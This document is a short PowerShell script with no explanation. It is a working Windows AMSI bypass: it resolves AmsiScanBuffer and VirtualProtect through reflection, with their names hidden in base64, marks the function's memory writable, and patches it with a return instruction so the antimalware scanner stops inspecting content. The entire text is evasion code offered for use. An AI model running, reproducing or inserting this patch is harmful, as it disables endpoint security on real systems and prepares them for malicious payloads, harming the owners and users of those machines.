function Get-FuncPtr {
    Param ($a, $b)
    $c = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location -match 'System\.dll$' }
    $d = $c.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $e = $d.GetMethods() | Where-Object { $_.Name -eq 'GetProcAddress' } | Select-Object -First 1
    $f = $d.GetMethod('GetModuleHandle')
    $g = $f.Invoke($null, @($a))
    return $e.Invoke($null, @($g, $b))
}

function Build-Delegate {
    Param ($x, $y = [Void])
    $z = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('TempAssembly')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $m = $z.DefineDynamicModule('TempModule', $false)
    $t = $m.DefineType('TempDelegate', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $t.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $x).SetImplementationFlags('Runtime, Managed')
    $t.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $y, $x).SetImplementationFlags('Runtime, Managed')
    return $t.CreateType()
}

$p1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YW1zaS5kbGw='))
$p2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QW1zaVNjYW5CdWZmZXI='))
$p3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('a2VybmVsMzIuZGxs'))
$p4 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VmlydHVhbFByb3RlY3Q='))

$addr = Get-FuncPtr $p1 $p2
$vpAddr = Get-FuncPtr $p3 $p4
$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpAddr, (Build-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$protect = 0
$delegate.Invoke($addr, 5, 0x40, [ref]$protect)
$data = [Byte[]]@(0xC3, 0x90, 0x90, 0x90, 0x90)
[System.Runtime.InteropServices.Marshal]::Copy($data, 0, $addr, 5)